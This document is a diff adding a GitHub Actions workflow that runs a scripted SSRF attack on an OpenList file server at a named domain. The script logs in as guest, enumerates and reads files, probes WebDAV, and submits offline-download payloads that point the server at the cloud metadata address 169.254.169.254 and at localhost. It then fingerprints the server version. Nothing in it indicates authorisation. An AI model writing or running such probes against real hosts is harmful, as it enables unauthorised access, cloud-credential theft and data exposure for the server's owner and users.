@@ -1,0 +1,52 @@
+name: openlist-ssrf-confirm
+on:
+  workflow_dispatch:
+jobs:
+  confirm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: OpenList SSRF confirm (unauth baseline + real-file read + webdav + preview)
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
+          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
+          AUTH="Authorization: ${TOKEN}"
+          echo "=== [0] UNAUTH baseline for the gated endpoints (expect 401, proving 403=permission not IP) ==="
+          for ep in "/api/fs/add_offline_download" "/api/fs/link" "/api/fs/rename" "/api/fs/get" "/api/fs/list"; do
+            CODE=$(curl -skS -m 12 -o /tmp/u.txt -w "%{http_code}" -X POST "$B$ep" -H "Content-Type: application/json" -d '{"path":"/"}' 2>/dev/null)
+            echo "UNAUTH $ep -> HTTP $CODE | $(head -c 120 /tmp/u.txt | tr -d '\n')"
+          done
+          echo "=== [1] real-file read: list a real dir, then /api/fs/get on a real path ==="
+          # get a real file path from root list
+          ROOT=$(curl -skS -m 15 -X POST "$B/api/fs/list" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","page":1,"per_page":2,"refresh":false}')
+          echo "ROOT head: $(echo "$ROOT" | head -c 300 | tr -d '\n')"
+          # pick a real subdir and list it
+          SUB=$(echo "$ROOT" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['data']['content'][0]['name']) if d.get('code')==200 and d.get('data',{}).get('content') else print('')" 2>/dev/null)
+          echo "SUB='$SUB'"
+          if [ -n "$SUB" ]; then
+            curl -skS -m 15 -X POST "$B/api/fs/list" -H "$AUTH" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\",\"page\":1,\"per_page\":5,\"refresh\":false}" -w "  [HTTP %{http_code}]\n" | head -c 600
+            echo
+            echo "--- /api/fs/get on /$SUB ---"
+            curl -skS -m 15 -X POST "$B/api/fs/get" -H "$AUTH" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\"}" -w "  [HTTP %{http_code}]\n" | head -c 800
+            echo
+            echo "--- /api/fs/preview on /$SUB ---"
+            curl -skS -m 15 -X POST "$B/api/fs/preview" -H "$AUTH" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\"}" -w "  [HTTP %{http_code}]\n" | head -c 800
+            echo
+            echo "--- /api/fs/content on /$SUB ---"
+            curl -skS -m 15 -X POST "$B/api/fs/content" -H "$AUTH" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB\"}" -o /dev/null -w "  [HTTP %{http_code}, size=%{size_download}]\n"
+          fi
+          echo "=== [2] WebDAV mount probe (/dav/) ==="
+          for dv in "/dav/" "/dav" "/api/dav/" "/webdav/"; do
+            CODE=$(curl -skS -m 12 -o /tmp/d.txt -w "%{http_code}" -X PROPFIND "$B$dv" -H "$AUTH" 2>/dev/null)
+            echo "DAV $dv -> HTTP $CODE | $(head -c 120 /tmp/d.txt | tr -d '\n')"
+          done
+          echo "=== [3] alternative offline-download field shapes (guest) ==="
+          for shape in '{"path":"/","urls":["http://169.254.169.254/latest/meta-data/"],"tool":"aria2"}' '{"path":"/","url":"http://169.254.169.254/latest/meta-data/"}' '{"path":"/","urls":["http://127.0.0.1:80/"],"tool":"qbittorrent"}'; do
+            echo "shape: $shape"
+            curl -skS -m 12 -X POST "$B/api/fs/add_offline_download" -H "$AUTH" -H "Content-Type: application/json" -d "$shape" -w "  [HTTP %{http_code}]\n" | head -c 200
+            echo
+          done
+          echo "=== [4] version probe via HTTP header /server banners ==="
+          curl -skS -m 12 -I "$B/" | grep -iE "server|x-powered|x-openlist|x-alist" 
+          echo "=== CONFIRM DONE ==="
